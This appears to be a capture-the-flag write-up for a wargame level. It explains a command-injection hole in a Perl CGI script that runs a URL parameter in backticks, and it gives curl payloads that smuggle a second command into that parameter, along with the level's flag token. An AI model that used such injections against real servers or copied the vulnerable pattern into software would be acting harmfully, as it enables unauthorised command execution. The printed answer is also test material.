# LEVEL 04

## 💡 Explanation

 * This file execute itself when doing `curl localhost:4747/level04.pl/`
 * And if the url has a query with a parameter 'x' it will print it.
 * As the text is between backticks and is a shell command we can use it at our advantage
 * `echo $y 2>&1` can become `echo Whatever && ourcommand 2>&1`
 * The last thing to do will be to encrypt spaces and & characters for urls
 * `curl localhost:4747/level04.pl/?x=yoo%3Bgetflag`

```bash
curl localhost:4747/level04.pl/?x=yoo%3Bgetflag
yoo
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

`level04.pl`
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

## 👾 Commands

```
cat level04.pl
./level04.pl
curl http://localhost:4747
curl http://localhost:4747/?x=lol
curl http://localhost:4747/?x=\`getflag\`
```

## 🔍 Resources

- [Perl language - Functions & Arguments](https://www.tutorialspoint.com/perl/perl_subroutines.htm)

## 🔥 Password
`ne2searoevaevoem4ov4ar8ap`
